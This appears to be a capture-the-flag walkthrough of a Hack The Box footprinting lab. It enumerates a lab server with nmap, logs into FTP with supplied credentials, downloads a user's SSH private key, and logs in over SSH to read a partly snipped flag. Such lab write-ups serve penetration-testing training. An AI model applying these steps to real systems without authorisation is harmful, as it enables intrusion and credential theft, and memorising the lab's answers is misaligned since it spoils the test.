# Footprinting - Easy Lab

**About:**

>We were commissioned by the company Inlanefreight Ltd to test three different servers in their internal network. The company uses many different services, and the IT security department felt that a penetration test was necessary to gain insight into their overall security posture.
>
>The first server is an internal DNS server that needs to be investigated. In particular, our client wants to know what information we can get out of these services and how this information could be used against its infrastructure. Our goal is to gather as much information as possible about the server and find ways to use that information against the company. However, our client has made it clear that it is forbidden to attack the services aggressively using exploits, as these services are in production.
>
>Additionally, our teammates have found the following credentials "ceil:qwer1234", and they pointed out that some of the company's employees were talking about SSH keys on a forum.
>
>The administrators have stored a flag.txt file on this server to track our progress and measure success. Fully enumerate the target and submit the contents of this file as proof.

---

**Goal:**

- *Enumerate the server carefully and find the flag.txt file. Submit the contents of this file as the answer.*

---

**Target Information:**

- Known credentials: `ceil:qwer1234`

---

**Enumeration:**

- nnmap

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-16 08:27 CDT
Nmap scan report for 10.129.150.116
PORT     STATE SERVICE VERSION
21/tcp   open  ftp
| fingerprint-strings:
|   GenericLines:
|     220 ProFTPD Server (ftp.int.inlanefreight.htb) [10.129.150.116]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.16.1-Ubuntu
2121/tcp open  ftp
| fingerprint-strings:
|   GenericLines:
|     220 ProFTPD Server (Ceil's FTP) [10.129.150.116]
```

---

**Initial Access:**

- ftp@ port 21 empty and owned by root
- ssh authentication failed needs certificate

- Successful ftp login @ 2121 w/ user credentials
  - Snatched users private key:

```bash
$ ftp -p $htb 2121
229 Entering Extended Passive Mode (|||10965|)
150 Opening ASCII mode data connection for file list
-rw-rw-r--   1 ceil     ceil          738 Nov 10  2021 authorized_keys
-rw-------   1 ceil     ceil         3381 Nov 10  2021 id_rsa
-rw-r--r--   1 ceil     ceil          738 Nov 10  2021 id_rsa.pub
226 Transfer complete
ftp> get id_rsa
local: id_rsa remote: id_rsa
229 Entering Extended Passive Mode (|||5579|)
150 Opening BINARY mode data connection for id_rsa (3381 bytes)
100% |********************************************************************************|  3381        6.44 MiB/s    00:00 ETA
226 Transfer complete
3381 bytes received in 00:00 (66.90 KiB/s)
```

- Gained  access to ssh with stolen private key:

```bash
$ ssh ceil@$htb -i id_rsa
The authenticity of host '10.129.150.116 (10.129.150.116)' can't be established.
ED25519 key fingerprint is SHA256:AtNYHXCA7dVpi58LB+uuPe9xvc2lJwA6y7q82kZoBNM.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:8: [hashed name]
    ~/.ssh/known_hosts:10: [hashed name]
    ~/.ssh/known_hosts:11: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.150.116' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-90-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 16 Aug 2025 01:45:22 PM UTC

  System load:  0.0               Processes:               160
  Usage of /:   86.7% of 3.87GB   Users logged in:         0
  Memory usage: 12%               IPv4 address for ens192: 10.129.150.116
  Swap usage:   0%

  => / is using 86.7% of 3.87GB


118 updates can be installed immediately.
1 of these updates is a security update.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Nov 10 05:48:02 2021 from 10.10.14.20
ceil@NIXEASY:~$
```

Flag found in /home/flag/flag.txt

```bash
ceil@NIXEASY:~$ ls -la /home/
total 20
drwxr-xr-x  5 root     root     4096 Nov 10  2021 .
drwxr-xr-x 20 root     root     4096 Mar 15  2024 ..
drwxr-xr-x  4 ceil     ceil     4096 Nov 10  2021 ceil
drwxr-xr-x  3 cry0l1t3 cry0l1t3 4096 Nov 10  2021 cry0l1t3
drwxr-xr-x  4 ceil     ceil     4096 Nov 10  2021 flag
ceil@NIXEASY:~$ cat /home/flag/flag.txt
HTB{--SNIP--hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}
```
